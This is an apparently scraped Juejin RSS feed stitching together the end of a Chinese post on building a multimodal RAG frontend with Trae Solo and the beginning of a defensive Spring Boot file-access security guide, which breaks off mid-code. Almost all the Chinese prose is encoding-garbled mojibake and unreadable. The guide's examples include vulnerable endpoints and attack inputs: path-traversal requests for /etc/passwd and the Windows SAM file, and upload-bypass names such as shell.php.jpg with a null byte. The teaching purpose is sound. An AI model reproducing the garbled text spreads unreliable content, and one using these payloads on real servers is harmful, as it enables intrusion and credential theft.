é¡¹ç›®ä½¿ç”¨Â <code>react-router-dom</code>Â (v7) ä½œä¸ºè·¯ç”±ç®¡ç†æ ¸å¿ƒã€‚<code>Home.tsx</code>Â ä½œä¸ºå¸ƒå±€ç»„ä»¶ï¼Œå®šä¹‰äº†ç³»ç»Ÿçš„æ•´ä½“å¯¼èˆªç»“æ„ã€‚å®ƒå°†å››ä¸ªæ ¸å¿ƒåŠŸèƒ½ï¼ˆæ™ºèƒ½é—®ç­”ã€å›¾ç‰‡åˆ†æã€éŸ³é¢‘è½¬å†™ã€PDFè§£æï¼‰æ˜ å°„åˆ°ä¸åŒçš„è·¯ç”±è·¯å¾„ï¼Œå®ç°äº†åŠŸèƒ½æ¨¡å—çš„éš”ç¦»ä¸æŒ‰éœ€åŠ è½½ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f1b479b4cd0f466589c58da5046d9d6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=Mxgq7Liew7vlIlezTYPedmJAjyw%3D" alt="19.png" loading="lazy"/></p>
</li>
<li>
<p><strong>ç»„ä»¶å¤ç”¨ç­–ç•¥</strong>ï¼š<br/>
å°½ç®¡å››ä¸ªåŠŸèƒ½é¡µé¢ï¼ˆ<code>text.tsx</code>,Â <code>image.tsx</code>,Â <code>audio.tsx</code>,Â <code>pdf.tsx</code>ï¼‰åœ¨ UI å’Œäº¤äº’ä¸Šé«˜åº¦ç›¸ä¼¼ï¼Œä½† Trae Solo å¹¶æ²¡æœ‰ç®€å•å¤åˆ¶ä»£ç ï¼Œè€Œæ˜¯å·§å¦™åœ°è¿ç”¨äº†Â <strong>ç»„ä»¶ç»„åˆä¸å±æ€§é©±åŠ¨</strong>Â çš„è®¾è®¡æ¨¡å¼ã€‚å®ƒä»¬å…±ç”¨åŒä¸€ä¸ªæ ¸å¿ƒçš„Â <code>ChatPage</code>Â ç»„ä»¶ï¼Œé€šè¿‡ä¼ å…¥ä¸åŒçš„Â <code>props</code>ï¼ˆå¦‚Â <code>title</code>,Â <code>extraUploadComponent</code>,Â <code>apiEndpoint</code>Â ç­‰ï¼‰æ¥å®šåˆ¶åŒ–å„è‡ªçš„è¡Œä¸ºä¸ç•Œé¢ï¼Œæå¤§åœ°æå‡äº†ä»£ç çš„å¯ç»´æŠ¤æ€§å’Œå¤ç”¨æ€§ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/19503dfbf8264e9d9d109a2d104cd10f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=P47UW%2B%2BWQOz6esu4zhRkxcVKajI%3D" alt="20.png" loading="lazy"/></p>
</li>
</ol>
<h3 data-id="heading-13">3.2 æµå¼å¯¹è¯äº¤äº’çš„å®ç°</h3>
<p><strong>æ ¸å¿ƒæŠ€æœ¯</strong>ï¼šå¯¹äºå¤§æ¨¡å‹é—®ç­”è¿™ç±»éœ€è¦å®æ—¶åé¦ˆçš„åœºæ™¯ï¼Œæµå¼è¾“å‡ºè‡³å…³é‡è¦ã€‚Trae Solo ç”Ÿæˆçš„ä»£ç ä¼˜é›…åœ°å®ç°äº†è¿™ä¸€åŠŸèƒ½ã€‚</p>
<ol>
<li>
<p><strong>çŠ¶æ€ç®¡ç†</strong>ï¼š<br/>
åœ¨Â <code>ChatPage/index.tsx</code>Â ä¸­ï¼Œä½¿ç”¨Â <code>useState</code>Â ç»´æŠ¤ä¸€ä¸ªÂ <code>messages</code>Â æ•°ç»„ï¼Œè¯¥æ•°ç»„å®æ—¶å­˜å‚¨å¹¶æ›´æ–°ç”¨æˆ·ä¸æ¨¡å‹ä¹‹é—´çš„å®Œæ•´å¯¹è¯è®°å½•ã€‚å†å²è®°å½•åœ¨<code>localstorage</code>ä¸­ï¼Œå½“ç„¶è¿™åªæ˜¯demo, çœŸå®ç”Ÿäº§ç¯å¢ƒä¸­å†å²è®°å½•è¦ä¿å­˜åœ¨æ•°æ®åº“ä¸­ã€‚</p>
</li>
<li>
<p><strong>æµå¼æ•°æ®è·å–ä¸æ¸²æŸ“</strong>ï¼š<br/>
å½“ç”¨æˆ·å‘é€æ¶ˆæ¯æ—¶ï¼Œå‰ç«¯ä¼šè°ƒç”¨å¯¹åº”çš„åç«¯æµå¼æ¥å£ã€‚æ ¸å¿ƒé€»è¾‘åœ¨äºä½¿ç”¨Â <code>fetch</code>Â API çš„Â <code>Response.body</code>Â è·å–ä¸€ä¸ªÂ <code>ReadableStream</code>ï¼Œå¹¶é€šè¿‡Â <code>reader</code>Â é€å— (<code>chunk</code>) è¯»å–æœåŠ¡å™¨æ¨é€çš„æ•°æ®ã€‚</p>
<ul>
<li><strong>å¢é‡æ›´æ–°</strong>ï¼šå½“åç«¯è¿”å›çš„æ•°æ®ç±»å‹ä¸ºÂ <code>content_delta</code>ï¼ˆå†…å®¹å¢é‡ï¼‰æ—¶ï¼Œä»£ç ä¼šç«‹å³æ›´æ–°å½“å‰æ­£åœ¨å›å¤çš„æ¶ˆæ¯å†…å®¹ï¼Œå®ç°æ–‡å­—çš„é€å­—è¾“å‡ºæ•ˆæœã€‚</li>
<li><strong>å®Œæˆå¤„ç†</strong>ï¼šå½“æ¥æ”¶åˆ°Â <code>message_complete</code>Â æ ‡è¯†æ—¶ï¼Œç»“æŸå½“å‰æ¶ˆæ¯çš„æµå¼æ¥æ”¶ï¼Œå¹¶å°†å®Œæ•´çš„æ¶ˆæ¯å¯¹è±¡å­˜å…¥Â <code>messages</code>Â çŠ¶æ€ï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡äº¤äº’ã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/61764a41257a4be18a3ae21832a8cef6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=qVb8KbBaWRv01oQ6iRIquxy%2F5Uw%3D" alt="21.png" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4d0ef77557043f1b5805b7e92da4d9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=qSvksavw9RkS3lnNqtOtZbGWHsI%3D" alt="22.png" loading="lazy"/></p>
</li>
</ol>
<h3 data-id="heading-14">3.3 PDF å¼•ç”¨æº¯æºåŠŸèƒ½çš„å®ç°</h3>
<p><strong>æ ¸å¿ƒä»·å€¼</strong>ï¼šè¿™æ˜¯ RAG ç³»ç»Ÿçš„å…³é”®ç‰¹æ€§ã€‚AI ä¸ä»…å›ç­”äº†é—®é¢˜ï¼Œè¿˜èƒ½æŒ‡æ˜ç­”æ¡ˆçš„æ¥æºã€‚</p>
<ol>
<li>
<p><strong>æ•°æ®ç»“æ„</strong>ï¼š<br/>
åç«¯åœ¨æµå¼å“åº”çš„æœ€åï¼Œä¼šè¿”å›ä¸€ä¸ªÂ <code>references</code>Â æ•°ç»„ï¼Œå…¶ä¸­åŒ…å«äº†å¼•ç”¨çš„åŸæ–‡ç‰‡æ®µã€æ‰€åœ¨é¡µç ç­‰å…ƒæ•°æ®ã€‚</p>
</li>
<li>
<p><strong>å‰ç«¯æ¸²æŸ“ä¸äº¤äº’</strong>ï¼š<br/>
<code>ChatPage/index.tsx</code>Â åœ¨æ¥æ”¶åˆ°å®Œæ•´çš„æ¶ˆæ¯å’Œå¼•ç”¨æ•°æ®åï¼Œä¼šè°ƒç”¨Â <code>renderContentWithReferences</code>Â å‡½æ•°è¿›è¡Œå¤„ç†ã€‚è¯¥å‡½æ•°çš„æ ¸å¿ƒé€»è¾‘æ˜¯ï¼š</p>
<ul>
<li><strong>æ™ºèƒ½åŒ¹é…</strong>ï¼šå°†å›ç­”æ–‡æœ¬ä¸­æ ‡è®°çš„å¼•ç”¨å ä½ç¬¦ï¼ˆå¦‚Â <code>[1]</code>ï¼‰ä¸Â <code>references</code>Â æ•°ç»„ä¸­çš„å…·ä½“æ¡ç›®è¿›è¡Œå…³è”ã€‚</li>
<li><strong>å¯äº¤äº’æ¸²æŸ“</strong>ï¼šå°†æ™®é€šçš„æ•°å­—æ ‡è®°æ¸²æŸ“æˆ<strong>å¯ç‚¹å‡»çš„é“¾æ¥æˆ–æŒ‰é’®</strong>ã€‚</li>
<li><strong>æº¯æºå±•ç¤º</strong>ï¼šå½“ç”¨æˆ·ç‚¹å‡»å¼•ç”¨æ ‡è®°æ—¶ï¼Œé€šè¿‡å¼¹å‡ºæ¡†ï¼ˆModalï¼‰ã€ä¾§è¾¹æ æˆ–é«˜äº®ç­‰å½¢å¼ï¼Œå±•ç¤ºå¯¹åº”çš„åŸæ–‡ç‰‡æ®µå’Œå‡ºå¤„ï¼Œå®Œç¾å®ç°äº†â€œç­”æ¡ˆå¯è¿½æº¯ï¼Œæ¥æºå¯æŸ¥éªŒâ€çš„ RAG æ ¸å¿ƒä½“éªŒã€‚</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ede62764eec243dba7692e73e9a106ea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765770311&amp;x-signature=QzlffBxLSidkaGR9d3dw7MfNnfs%3D" alt="23.png" loading="lazy"/></p>
</li>
</ol>
<p>å…³äºè¯¥é¡¹ç›®çš„å…¨éƒ¨ä»£ç ï¼Œå¤§å®¶å¯å…³æ³¨ç¬”è€…çš„åŒåå¾®ä¿¡å…¬ä¼—å·Â <strong>å¤§æ¨¡å‹çœŸå¥½ç©</strong>ï¼Œå¹¶å›å¤<strong>LangChainæ™ºèƒ½ä½“å¼€å‘</strong>å³å¯è·å¾—ã€‚</p>
<h2 data-id="heading-15">å››ã€ æ€»ç»“</h2>
<p>æœ¬ç¯‡åˆ†äº«ç¬”è€…ç³»ç»Ÿæ€§åœ°å±•ç¤ºäº†å¦‚ä½•åˆ©ç”¨ Trae Soloï¼Œé«˜æ•ˆæ„å»ºå¤šæ¨¡æ€ RAG ç³»ç»Ÿçš„å‰ç«¯ç•Œé¢ï¼Œå®Œæˆäº†æ•´ä¸ªå…¨æ ˆåº”ç”¨çš„é—­ç¯ã€‚å›é¡¾æœ¬æ¬¡å®è·µï¼Œ ç¬”è€…ä¸ä»…æˆåŠŸè·å¾—äº†å¯ç”¨çš„å‰ç«¯é¡¹ç›®ï¼Œæ›´é‡è¦çš„æ˜¯ç³»ç»Ÿæ€»ç»“å¹¶éªŒè¯äº†ä¸€å¥—è¡Œä¹‹æœ‰æ•ˆçš„Â <strong>Vibe Coding æœ€ä½³å®è·µæŒ‡å—</strong>â€”â€”ä»ç¼–å†™ç»“æ„åŒ–çš„æç¤ºè¯ã€è¿›è¡Œæç¤ºè¯ä¼˜åŒ–ï¼Œåˆ°ç²¾å‡†å®šä½å’Œä¿®å¤é—®é¢˜ã€‚è¿™å¥—æ–¹æ³•è®ºæœ‰æ•ˆæå‡äº†å¤§æ¨¡å‹ç¼–ç¨‹çš„ç¡®å®šæ€§ä¸äº§å‡ºè´¨é‡ã€‚</p>
<p>è‡³æ­¤ï¼ŒåŸºäº LangChain 1.0 æ„å»ºå¤šæ¨¡æ€ RAG ç³»ç»Ÿçš„ç³»åˆ—æ ¸å¿ƒæ•™ç¨‹å·²å‘Šä¸€æ®µè½ã€‚ç„¶è€Œï¼Œæ™ºèƒ½ä½“ï¼ˆAgentï¼‰å¼€å‘é¢†åŸŸçš„æ¢ç´¢æ°¸æ— æ­¢å¢ƒã€‚åˆ«å¿˜äº†ï¼ŒLangGraph ä¹Ÿå·²æ­£å¼å‘å¸ƒ 1.0 ç‰ˆæœ¬ï¼Œå…¶å¼ºå¤§çš„å¤šæ™ºèƒ½ä½“ç¼–æ’èƒ½åŠ›å°†ä¸ºåº”ç”¨å¼€å‘æ‰“å¼€å…¨æ–°çš„æƒ³è±¡ç©ºé—´ã€‚æ­¤å¤–ï¼ŒLangChain å®˜æ–¹æ¨å‡ºçš„ deepAgents ç­‰æ¡†æ¶ï¼Œæ­£ä¸æ–­é™ä½ç€å¤æ‚æ™ºèƒ½ä½“ç³»ç»Ÿçš„å¼€å‘é—¨æ§›ã€‚ç¬”è€…å¯¹æ­¤å°†ä¸æ–­è·Ÿéšå¹¶ä¸€ç›´æ›´æ–°ä¸‹å»ï¼Œè®©å¤§å®¶æ¯ä¸ªäººéƒ½æŒæ¡æ™ºèƒ½ä½“å¼€å‘å¿…å¤‡æŠ€èƒ½ã€‚</p>
<p><a href="https://juejin.cn/column/7526240014499495972" title="https://juejin.cn/column/7526240014499495972" target="_blank">ã€Šæ·±å…¥æµ…å‡ºLangChain&amp;LangGraph AI Agent æ™ºèƒ½ä½“å¼€å‘ã€‹</a>ä¸“æ å†…å®¹æºè‡ªç¬”è€…åœ¨å®é™…å­¦ä¹ å’Œå·¥ä½œä¸­å¯¹ LangChain ä¸ LangGraph çš„æ·±åº¦ä½¿ç”¨ç»éªŒï¼Œæ—¨åœ¨å¸®åŠ©å¤§å®¶ç³»ç»Ÿæ€§åœ°ã€é«˜æ•ˆåœ°æŒæ¡ AI Agent çš„å¼€å‘æ–¹æ³•ï¼Œåœ¨å„å¤§æŠ€æœ¯å¹³å°è·å¾—äº†ä¸å°‘å…³æ³¨ä¸æ”¯æŒã€‚ç›®å‰å·²æ›´æ–°30è®²ï¼Œæ­£åœ¨æ›´æ–°å®æˆ˜ç¯‡å’ŒLangChain1.0å®æˆ˜é¡¹ç›®å¤šæ¨¡æ€RAGç³»ç»Ÿå¼€å‘ï¼Œå¹¶éšæ—¶è¡¥å……ç¬”è€…åœ¨å®é™…å·¥ä½œä¸­æ€»ç»“çš„æ‹“å±•çŸ¥è¯†ç‚¹ã€‚å¦‚æœå¤§å®¶æ„Ÿå…´è¶£ï¼Œæ¬¢è¿å…³æ³¨ç¬”è€…çš„æ˜é‡‘è´¦å·ä¸ä¸“æ ï¼Œä¹Ÿå¯å…³æ³¨ç¬”è€…çš„åŒåå¾®ä¿¡å…¬ä¼—å·Â <strong>å¤§æ¨¡å‹çœŸå¥½ç©</strong>ï¼Œæ¯æœŸåˆ†äº«æ¶‰åŠçš„ä»£ç å‡å¯åœ¨å…¬ä¼—å·ç§ä¿¡:Â <strong>LangChainæ™ºèƒ½ä½“å¼€å‘</strong>å…è´¹è·å–ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Bootå®ç°æ–‡ä»¶è®¿é—®å®‰å…¨]]></title>    <link>https://juejin.cn/post/7580372534043951147</link>    <guid>https://juejin.cn/post/7580372534043951147</guid>    <pubDate>2025-12-08T00:07:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580372534043951147" data-draft-id="7579190764770918440" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Bootå®ç°æ–‡ä»¶è®¿é—®å®‰å…¨"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T00:07:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é£è±¡å—"/> <meta itemprop="url" content="https://juejin.cn/user/2524134428655159"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Bootå®ç°æ–‡ä»¶è®¿é—®å®‰å…¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2524134428655159/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é£è±¡å—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T00:07:47.000Z" title="Mon Dec 08 2025 00:07:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    32
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>åœ¨Webåº”ç”¨å¼€å‘ä¸­ï¼Œæ–‡ä»¶ä¸Šä¼ ã€ä¸‹è½½å’Œè¯»å–åŠŸèƒ½æ˜¯å¸¸è§éœ€æ±‚ã€‚ç„¶è€Œï¼Œä¸å®‰å…¨çš„æ–‡ä»¶è®¿é—®å®ç°å¯èƒ½å¯¼è‡´ä¸¥é‡çš„<strong>ä»»æ„æ–‡ä»¶è¯»å–/å†™å…¥</strong>æ¼æ´ï¼Œæ”»å‡»è€…å¯èƒ½å€Ÿæ­¤è¯»å–æœåŠ¡å™¨ä¸Šçš„æ•æ„Ÿé…ç½®æ–‡ä»¶ã€æ•°æ®åº“å‡­æ®ï¼Œç”šè‡³ç³»ç»Ÿæ–‡ä»¶ï¼Œé€ æˆä¸¥é‡çš„æ•°æ®æ³„éœ²ã€‚</p>
<h2 data-id="heading-1">å¸¸è§çš„æ–‡ä»¶è®¿é—®å®‰å…¨é£é™©</h2>
<h4 data-id="heading-2">1. ä»»æ„è·¯å¾„éå†ï¼ˆPath Traversalï¼‰</h4>
<p>è·¯å¾„éå†æ˜¯æœ€å¸¸è§çš„æ–‡ä»¶è®¿é—®å®‰å…¨é—®é¢˜ï¼Œæ”»å‡»è€…é€šè¿‡<code>../</code>ã€<code>..\\</code>ç­‰åºåˆ—æ¥è®¿é—®ç›®å½•å¤–çš„æ–‡ä»¶ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å±é™©ä»£ç ç¤ºä¾‹ - å­˜åœ¨è·¯å¾„éå†æ¼æ´</span>
<span class="hljs-meta">@GetMapping("/files")</span>
<span class="hljs-keyword">public</span> ResponseEntity&lt;Resource&gt; <span class="hljs-title function_">getFile</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String filename)</span> {
    <span class="hljs-comment">// æåº¦å±é™©ï¼ç”¨æˆ·å¯ä»¥ç›´æ¥è®¿é—®ä»»æ„æ–‡ä»¶</span>
    <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">"/uploads/"</span> + filename);
    <span class="hljs-keyword">return</span> ResponseEntity.ok()
        .body(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileSystemResource</span>(file));
}

<span class="hljs-comment">// æ”»å‡»ç¤ºä¾‹ï¼š</span>
<span class="hljs-comment">// GET /files?filename=../../../../etc/passwd</span>
<span class="hljs-comment">// GET /files?filename=..\\..\\..\\windows\\system32\\config\\sam</span>
</code></pre>
<h4 data-id="heading-3">2. æ–‡ä»¶ç±»å‹ç»•è¿‡</h4>
<p>ä¸å……åˆ†çš„æ–‡ä»¶ç±»å‹éªŒè¯å¯èƒ½å¯¼è‡´æ¶æ„æ–‡ä»¶ä¸Šä¼ ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å®‰å…¨çš„æ–‡ä»¶ç±»å‹æ£€æŸ¥</span>
<span class="hljs-meta">@PostMapping("/upload")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">upload</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> MultipartFile file)</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">filename</span> <span class="hljs-operator">=</span> file.getOriginalFilename();
    <span class="hljs-keyword">if</span> (filename.endsWith(<span class="hljs-string">".jpg"</span>) || filename.endsWith(<span class="hljs-string">".png"</span>)) {
        <span class="hljs-comment">// å±é™©ï¼šä»…æ£€æŸ¥æ–‡ä»¶ååç¼€ï¼Œæ”»å‡»è€…å¯ä»¥ä¸Šä¼ </span>
        <span class="hljs-comment">// shell.php.jpg æˆ– double-header.php%00.jpg</span>
    }
}
</code></pre>
<h4 data-id="heading-4">3. ç¬¦å·é“¾æ¥æ”»å‡»</h4>
<p>ç¬¦å·é“¾æ¥å¯èƒ½è¢«ç”¨æ¥ç»•è¿‡è®¿é—®é™åˆ¶ï¼ŒæŒ‡å‘ç³»ç»Ÿæ•æ„Ÿæ–‡ä»¶ã€‚</p>
<h4 data-id="heading-5">4. æ–‡ä»¶åŒ…å«æ¼æ´</h4>
<p>ä¸å½“çš„æ–‡ä»¶åŒ…å«å¯èƒ½å¯¼è‡´ä»£ç æ‰§è¡Œã€‚</p>
<h2 data-id="heading-6">Spring Boot å®‰å…¨æ–‡ä»¶è®¿é—®å®ç°</h2>
<h4 data-id="heading-7">1. è·¯å¾„ç™½åå•éªŒè¯</h4>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.util.StringUtils;
<span class="hljs-keyword">import</span> java.nio.file.Path;
<span class="hljs-keyword">import</span> java.nio.file.Paths;
<span class="hljs-keyword">import</span> java.util.Arrays;
<span class="hljs-keyword">import</span> java.util.HashSet;
<span class="hljs-keyword">import</span> java.util.Set;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecureFileService</span> {

    <span class="hljs-comment">// å…è®¸è®¿é—®çš„åŸºç¡€ç›®å½•</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Set&lt;Path&gt; ALLOWED_BASE_PATHS = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;(Arrays.asList(
        Paths.get(<span class="hljs-string">"/app/uploads"</span>).normalize(),
        Paths.get(<span class="hljs-string">"/app/public"</span>).normalize()
    ));

    <span class="hljs-comment">// å…è®¸çš„æ–‡ä»¶æ‰©å±•å</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Set&lt;String&gt; ALLOWED_EXTENSIONS = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;(Arrays.asList(
        <span class="hljs-string">"jpg"</span>, <span class="hljs-string">"jpeg"</span>, <span class="hljs-string">"png"</span>, <span class="hljs-string">"gif"</span>, <span class="hljs-string">"pdf"</span>, <span class="hljs-string">"txt"</span>, <span class="hljs-string">"doc"</span>, <span class="hljs-string">"docx"</span>
    ));

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isPathSafe</span><span class="hljs-params">(String requestedPath)</span> {
        <span class="hljs-keyword">if</span> (!StringUtils.hasText(requestedPath)) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }

        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// è§„èŒƒåŒ–è·¯å¾„ï¼Œè§£ææ‰€æœ‰ . å’Œ ..</span>
            <span class="hljs-type">Path</span> <span class="hljs-variable">normalizedPath</span> <span class="hljs-operator">=</span> Paths.get(requestedPath).normalize();

            <span class="hljs-comment">// æ£€æŸ¥æ˜¯å¦åœ¨å…è®¸çš„åŸºç¡€ç›®å½•å†…</span>
            <span class="hljs-keyword">for</span> (Path basePath : ALLOWED_BASE_PATHS) {
                <span class="hljs-keyword">if</span> (normalizedPath.startsWith(basePath)) {
